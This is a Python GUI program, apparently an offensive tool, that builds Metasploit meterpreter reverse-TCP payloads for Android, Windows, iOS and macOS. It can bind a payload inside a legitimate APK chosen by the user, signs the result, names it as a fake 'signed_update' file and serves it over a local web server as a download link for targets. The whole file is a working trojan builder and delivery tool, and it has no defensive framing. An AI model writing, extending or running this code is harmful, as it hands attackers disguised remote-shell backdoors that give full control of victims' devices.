import os
import socket
import threading
import http.server
import socketserver
import customtkinter as ctk
from tkinter import messagebox, filedialog
import subprocess
from pymetasploit3.msfrpc import MsfRpcClient

class EliteBinderGUI(ctk.CTk):
    def __init__(self):
        super().__init__()

        # --- Basic Setup ---
        self.title("⚡ Elite App Binder & C2 Center")
        self.geometry("750x950")
        ctk.set_appearance_mode("Dark")
        
        self.server_port = 8080
        self.is_hosting = False
        self.selected_apk = ""

        # --- Header ---
        self.header_frame = ctk.CTkFrame(self, fg_color="transparent")
        self.header_frame.pack(fill="x", padx=20, pady=10)
        
        self.mode_switch = ctk.CTkSwitch(self.header_frame, text="Dark Mode", command=self.change_mode)
        self.mode_switch.select()
        self.mode_switch.pack(side="right")

        self.title_label = ctk.CTkLabel(self, text="ADVANCED PAYLOAD BINDER", font=("Orbitron", 28, "bold"), text_color="#3498db")
        self.title_label.pack(pady=10)

        # --- Main UI Container ---
        self.main_container = ctk.CTkFrame(self, corner_radius=20)
        self.main_container.pack(fill="both", expand=True, padx=30, pady=10)

        # OS Selection
        self.target_var = ctk.StringVar(value="Android")
        self.target_menu = ctk.CTkOptionMenu(self.main_container, values=["Android", "Windows", "iOS", "macOS"], variable=self.target_var, width=300)
        self.target_menu.pack(pady=15)

        # Bind APK Option (Only for Android)
        self.btn_select_apk = ctk.CTkButton(self.main_container, text="📁 Select Original APK to Bind", command=self.select_apk, fg_color="#34495e")
        self.btn_select_apk.pack(pady=5)
        self.apk_label = ctk.CTkLabel(self.main_container, text="No APK Selected (Optional)", text_color="gray")
        self.apk_label.pack()

        # Inputs
        self.entry_ip = ctk.CTkEntry(self.main_container, placeholder_text="LHOST (Your IP)", width=400, height=45)
        self.entry_ip.insert(0, self.get_my_ip())
        self.entry_ip.pack(pady=10)

        self.entry_port = ctk.CTkEntry(self.main_container, placeholder_text="LPORT (Connection Port)", width=400, height=45)
        self.entry_port.insert(0, "4444")
        self.entry_port.pack(pady=10)

        # Action Buttons
        self.btn_build = ctk.CTkButton(self.main_container, text="🔥 BUILD & SIGN PAYLOAD", command=self.build_and_sign, height=55, width=400, fg_color="#e67e22", font=("Arial", 16, "bold"))
        self.btn_build.pack(pady=20)

        # --- Console & Status ---
        self.console = ctk.CTkTextbox(self, height=250, width=680, fg_color="black", text_color="#00FF00", font=("Consolas", 12))
        self.console.pack(pady=10, padx=30)
        self.log("System Ready. Please check LHOST and LPORT.")

    def log(self, msg):
        self.console.insert("end", f"> {msg}\n")
        self.console.see("end")

    def change_mode(self):
        ctk.set_appearance_mode("Dark" if self.mode_switch.get() == 1 else "Light")

    def get_my_ip(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try: s.connect(("8.8.8.8", 80)); return s.getsockname()[0]
        except: return "127.0.0.1"
        finally: s.close()

    def select_apk(self):
        self.selected_apk = filedialog.askopenfilename(filetypes=[("APK files", "*.apk")])
        if self.selected_apk:
            self.apk_label.configure(text=f"Selected: {os.path.basename(self.selected_apk)}", text_color="lightgreen")

    def build_and_sign(self):
        target = self.target_var.get()
        lhost = self.entry_ip.get()
        lport = self.entry_port.get()
        ext = "apk" if target == "Android" else "exe"
        final_file = f"signed_update_{target.lower()}.{ext}"

        if not lhost or not lport:
            messagebox.showwarning("Error", "Fill LHOST and LPORT")
            return

        def process():
            self.log(f"Starting build process for {target}...")
            
            # 1. Metasploit Command (Binding Logic)
            if target == "Android" and self.selected_apk:
                self.log(f"Binding payload with {os.path.basename(self.selected_apk)}...")
                cmd = f"msfvenom -x '{self.selected_apk}' -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o raw_payload.apk"
            else:
                cmd = f"msfvenom -p {target.lower()}/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o raw_payload.{ext}"

            try:
                subprocess.run(cmd, shell=True, check=True)
                
                # 2. Signing Logic (Important for Compatibility)
                if target == "Android":
                    self.log("Generating debug key and signing APK...")
                    # Generate keystore if not exists
                    if not os.path.exists("debug.keystore"):
                        subprocess.run("keytool -genkey -v -keystore debug.keystore -storepass android -alias androiddebugkey -keypass android -keyalg RSA -keysize 2048 -validity 10000 -dname 'CN=Android,O=Google,C=US'", shell=True)
                    
                    # Sign using jarsigner
                    subprocess.run(f"jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore debug.keystore -storepass android raw_payload.apk androiddebugkey", shell=True)
                    os.rename("raw_payload.apk", final_file)
                else:
                    os.rename(f"raw_payload.{ext}", final_file)

                # 3. Deployment Link
                self.log(f"Build Complete: {final_file}")
                url = f"http://{lhost}:{self.server_port}/{final_file}"
                self.log(f"LIVE LINK: {url}")
                
                if not self.is_hosting:
                    threading.Thread(target=self.start_server, daemon=True).start()
                
                messagebox.showinfo("Success", f"Payload is Signed and Live!\nLink: {url}")

            except Exception as e:
                self.log(f"Critical Error: {e}")

        threading.Thread(target=process).start()

    def start_server(self):
        handler = http.server.SimpleHTTPRequestHandler
        with socketserver.TCPServer(("", self.server_port), handler) as httpd:
            self.is_hosting = True
            httpd.serve_forever()

if __name__ == "__main__":
    app = EliteBinderGUI()
    app.mainloop()
